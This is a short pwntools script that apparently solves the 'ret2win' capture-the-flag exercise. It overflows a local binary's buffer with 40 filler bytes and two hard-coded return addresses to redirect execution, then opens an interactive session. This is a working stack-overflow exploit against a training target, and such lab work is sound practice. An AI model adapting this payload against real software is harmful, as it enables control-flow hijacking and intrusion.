from pwn import *

exe = './ret2win'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
p.sendline(40*b"a"+ p64(0x00000000004006e7)+ p64(0x0000000000400756))
p.interactive()

